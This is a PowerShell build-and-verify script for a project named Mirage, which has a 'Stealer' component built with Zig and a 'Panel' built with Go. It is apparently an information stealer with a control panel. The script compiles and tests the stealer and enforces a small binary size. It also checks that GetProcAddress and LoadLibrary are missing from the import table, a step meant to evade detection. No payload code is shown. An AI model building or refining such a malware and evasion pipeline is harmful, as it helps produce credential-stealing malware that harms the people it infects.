# Build Stealer — run from Mirage project root
# Usage: .\scripts\build_and_verify.ps1

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$repoRoot = Split-Path -Parent $scriptRoot
Write-Host "=== Building Mirage.Stealer ===" -ForegroundColor Cyan
Push-Location "$repoRoot\Mirage.Stealer"
zig build 2>&1
if ($LASTEXITCODE -ne 0) { Pop-Location; Write-Host "FAILED" -ForegroundColor Red; exit 1 }

# Test Stealer
zig build test 2>&1
if ($LASTEXITCODE -ne 0) { Pop-Location; Write-Host "TESTS FAILED" -ForegroundColor Red; exit 1 }

Pop-Location

# Check size
$binPath = "$repoRoot\Mirage.Stealer\zig-out\bin\Mirage.exe"
if (Test-Path $binPath) {
    $size = (Get-Item $binPath).Length
    Write-Host "Size: $size bytes" -ForegroundColor Yellow
    if ($size -gt 150KB) { Write-Host "WARNING: Binary > 150KB" -ForegroundColor Yellow }
} else {
    Write-Host "WARNING: Mirage.exe not found — size check skipped" -ForegroundColor Yellow
}

# Build Panel
Write-Host "=== Building Mirage.Panel ===" -ForegroundColor Cyan
Push-Location "$repoRoot\Mirage.Panel"
go build -o panel.exe ./cmd/panel 2>&1
if ($LASTEXITCODE -ne 0) { Pop-Location; Write-Host "PANEL BUILD FAILED" -ForegroundColor Red; exit 1 }
Pop-Location

# IAT verification (check for GetProcAddress in imports)
Write-Host "=== IAT Verification ===" -ForegroundColor Cyan
if (Test-Path $binPath) {
    $dumpbin = Get-Command dumpbin -ErrorAction SilentlyContinue
    if ($dumpbin) {
        $iat = & dumpbin /imports $binPath 2>&1
        if ($iat -match "GetProcAddress") { Write-Host "WARNING: GetProcAddress in IAT" -ForegroundColor Yellow }
        if ($iat -match "LoadLibrary") { Write-Host "WARNING: LoadLibrary in IAT" -ForegroundColor Yellow }
    } else {
        Write-Host "IAT check skipped — dumpbin not found (install Visual Studio C++ tools)" -ForegroundColor Yellow
    }
}

Write-Host "=== ALL CHECKS PASSED ===" -ForegroundColor Green
